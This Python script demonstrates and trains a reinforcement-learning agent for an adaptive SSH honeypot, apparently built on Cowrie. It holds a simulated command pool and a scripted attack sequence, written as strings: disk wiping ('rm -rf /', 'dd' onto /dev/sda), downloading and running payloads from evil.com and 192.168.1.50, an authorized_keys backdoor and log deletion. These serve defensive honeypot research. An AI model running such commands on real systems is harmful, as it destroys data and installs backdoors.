from __future__ import annotations

import sys
import os
import time
import importlib.util
import builtins
import random

# ---------------------------------------------------------
# PATH SETUP
# ---------------------------------------------------------
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(CURRENT_DIR, "../../.."))

# ---------------------------------------------------------
# RL IMPORTS
# ---------------------------------------------------------
sys.path.append(os.path.join(PROJECT_ROOT, "src"))
from cowrie.adaptive.rl_agent import RLAgent, StateBuilder

# ---------------------------------------------------------
# LOAD SESSION COLLECTOR
# ---------------------------------------------------------
collector_path = os.path.join(
    PROJECT_ROOT,
    "src/cowrie/adaptive/telemetry/session_collector.py"
)
spec = importlib.util.spec_from_file_location("session_collector", collector_path)
collector_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(collector_module)
SessionCollector = collector_module.SessionCollector

# ---------------------------------------------------------
# LOAD POLICY ENGINE
# ---------------------------------------------------------
policy_path = os.path.join(
    PROJECT_ROOT,
    "src/cowrie/adaptive/policy/policy_engine.py"
)
spec = importlib.util.spec_from_file_location("policy_engine", policy_path)
policy_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(policy_module)
PolicyEngine = policy_module.PolicyEngine


# ---------------------------------------------------------
# COMMAND POOL FOR SIMULATION
# ---------------------------------------------------------
COMMAND_POOL = [
    # Recon
    "ls", "pwd", "whoami", "id", "uname -a", "cat /etc/issue",
    
    # Creds
    "cat /etc/passwd", "cat /etc/shadow", "find . -name *.pem", 
    "grep -r password .", "cat .env",
    
    # Priv Esc
    "sudo su", "su root", "chmod +s /bin/bash", 
    
    # Destructive
    "rm -rf /", "dd if=/dev/zero of=/dev/sda", "wget http://evil.com/malware"
]

# ---------------------------------------------------------
# TRAINING LOOP
# ---------------------------------------------------------
def train_agent(episodes=1000):
    print(f"\n[*] Starting Training for {episodes} episodes...")
    agent = RLAgent()
    
    # Try loading existing model to continue training
    if os.path.exists("q_table.pkl"):
        agent.load_model("q_table.pkl")
    
    total_rewards = []
    
    for episode in range(episodes):
        session_id = f"train-sess-{episode}"
        collector = SessionCollector(session_id)
        
        # Random session length 5-30 commands
        session_length = random.randint(5, 30)
        
        prev_state = None
        prev_action = None
        episode_reward = 0
        
        for _ in range(session_length):
            # Select random command
            cmd = random.choice(COMMAND_POOL)
            collector.add_command(cmd)
            
            # --- State Extraction ---
            cmd_cat = StateBuilder.categorize_command(cmd)
            ht_triggered = 1 if "shadow" in cmd or ".pem" in cmd else 0 # Simulating honeytoken trigger
            if ht_triggered:
                collector.add_alert("HONEYTOKEN ACCESSED")
            
            cmd_count = len(collector.commands)
            sess_len_disc = StateBuilder.discretize_session_length(cmd_count)
            
            # Simple risk simulation
            risk_level = 0
            if ht_triggered: risk_level = 3
            elif cmd_cat == 3: risk_level = 2
            elif cmd_cat == 2: risk_level = 1
            
            current_state = StateBuilder.encode_state(cmd_cat, ht_triggered, sess_len_disc, risk_level)
            
            # --- Update Step (if we have prev state) ---
            if prev_state is not None:
                # Reward Calculation
                reward = 1
                if "HONEYTOKEN" in str(collector.get_summary()): reward += 5 # Simplified check
                if cmd_count > 20: reward += 10
                
                agent.update(prev_state, prev_action, reward, current_state)
                episode_reward += reward
            
            # --- Choose Action ---
            action = agent.choose_action(current_state, training=True)
            
            # Store
            prev_state = current_state
            prev_action = action
            
            # Simulation: If action is Terminate (5), break session
            if action == 5:
                # Reward for early disconnect? 
                # The user said "-10 if attacker disconnects early". 
                # Here the AGENT terminates. 
                # User's reward rule: "-10 if attacker disconnects early".
                # If agent terminates, maybe it's good (prevent damage)? 
                # But let's stick to the prompt. 
                # If agent terminates, session ends.
                break
        
        total_rewards.append(episode_reward)
        if episode % 100 == 0:
            print(f"Episode {episode}: Total Reward = {episode_reward}")
            
    
    # Save Model
    agent.save_model("q_table.pkl")
    print("[*] Training Complete. Model Saved.")

    # Plot Reward Curve
    try:
        import matplotlib
        matplotlib.use('Agg')
        import matplotlib.pyplot as plt
        plt.figure(figsize=(10, 6))
        plt.plot(total_rewards)
        plt.title("Training Reward Curve")
        plt.xlabel("Episode")
        plt.ylabel("Total Reward")
        plt.grid(True)
        plt.savefig("reward_curve.png")
        print("[*] Graph saved: reward_curve.png")
    except ImportError:
        print("[!] Matplotlib not installed. Skipping graph generation.")

# ---------------------------------------------------------
# UTIL: TYPEWRITER EFFECT
# ---------------------------------------------------------
def type_writer(text: str, speed: float = 0.02):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(speed)
    print()


# ---------------------------------------------------------
# MAIN DEMO
# ---------------------------------------------------------
def main():
    if "--train" in sys.argv:
        train_agent()
        return

    print("\n" + "=" * 60)
    print("  ADAPTIVE SSH HONEYPOT :: RL AGENT DEMO")
    print("=" * 60 + "\n")

    # Initialize components
    agent = RLAgent()
    if os.path.exists("q_table.pkl"):
        agent.load_model("q_table.pkl")
    else:
        print("[!] No trained model found. Running with untrained agent.")

    print("[*] Initializing Session Collector...", end=" ")
    collector = SessionCollector(session_id="session-demo-001")
    print("DONE.")

    print("[*] Initializing Policy Engine...", end=" ")
    policy_engine = PolicyEngine()
    print("DONE.")

    print("\n" + "-" * 60)
    print("SCENARIO START: Unknown User connects via SSH")
    print("-" * 60)

    # ---------------------------------------------------------
    # COMMAND SCENARIO (FULL ATTACK LIFECYCLE)
    # ---------------------------------------------------------
    steps = [
        # 🟢 LOW RISK – Reconnaissance
        ("whoami", "Identify current user"),
        ("id", "Check UID and groups"),
        ("pwd", "Check working directory"),
        ("uname -a", "Kernel and OS fingerprinting"),
        ("hostname", "Identify system hostname"),
        ("ls", "List directory contents"),
        ("ls -la", "Detailed file enumeration"),

        # 🟡 MEDIUM RISK – Discovery & Credentials
        ("cat /etc/passwd", "Enumerate local users"),
        ("getent passwd", "User enumeration via NSS"),
        ("env", "Inspect environment variables"),
        ("history", "Inspect command history"),
        ("sudo -l", "Probe sudo privileges"),

        # 🔴 HIGH RISK – Payload Delivery & Execution
        ("wget http://192.168.1.50/backdoor.sh", "Download external payload"),
        ("curl http://192.168.1.50/loader.sh", "Alternate payload fetch"),
        ("chmod +x backdoor.sh", "Make payload executable"),
        ("sh backdoor.sh", "Execute payload"),
        ("./backdoor.sh", "Direct payload execution"),

        # 🔴🔴 CRITICAL – Privilege Escalation & Persistence
        ("sudo su", "Attempt root escalation"),
        ("su root", "Switch to root user"),
        (
            "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
            "Add persistent SSH backdoor"
        ),
        ("crontab -l", "List cron jobs"),
        ("crontab -e", "Create persistence via cron"),

        # ⚫ VERY HIGH – Defense Evasion & Destruction
        ("rm -rf /var/log/cowrie", "Attempt to delete honeypot logs"),
        ("rm -rf /var/log/*", "Wipe system logs"),
        ("history -c", "Clear command history"),
        ("unset HISTFILE", "Disable shell history tracking"),
    ]

    # ---------------------------------------------------------
    # EXECUTE SCENARIO
    # ---------------------------------------------------------
    prev_state = None
    prev_action = None

    for cmd, description in steps:
        type_writer(f"\n[ATTACKER] > {cmd}")
        time.sleep(0.4)

        # Update telemetry
        if "wget" in cmd or "curl" in cmd:
            collector.add_url(cmd.split()[-1])

        collector.add_command(cmd)
        
        # --- RL Step ---
        cmd_cat = StateBuilder.categorize_command(cmd)
        ht_triggered = 1 if (hasattr(collector, 'alerts') and collector.alerts) else 0
        cmd_count = len(collector.commands)
        sess_len = StateBuilder.discretize_session_length(cmd_count)
        
        risk_level = 0
        if ht_triggered: risk_level = 3
        elif cmd_cat == 3: risk_level = 2
        elif cmd_cat == 2: risk_level = 1
        
        current_state = StateBuilder.encode_state(cmd_cat, ht_triggered, sess_len, risk_level)
        
        # Action (Inference)
        action = agent.choose_action(current_state, training=False)
        action_name = agent.ACTION_MAP[action]
        
        print(f"   [RL AGENT] Action: {action_name} ({action})")
        
        # Apply Policy
        policy_update = {
            "intent": "adaptive_response",
            "risk": "low",
            "policy": "passive_monitoring"
        }
        
        if action == 4: # Escalate
            policy_update["policy"] = "aggressive_deception"
            policy_update["risk"] = "high"
            print("   [!!!] AGGRESSIVE DECEPTION TRIGGERED")
        elif action == 5: # Terminate
             print("   [!!!] TERMINATING SESSION")
             break
             
        policy_engine.update_policy("session-demo-001", policy_update)

        time.sleep(0.5)

    print("\n" + "=" * 60)
    print("DEMO COMPLETE")
    print("=" * 60 + "\n")


# ---------------------------------------------------------
if __name__ == "__main__":
    main()
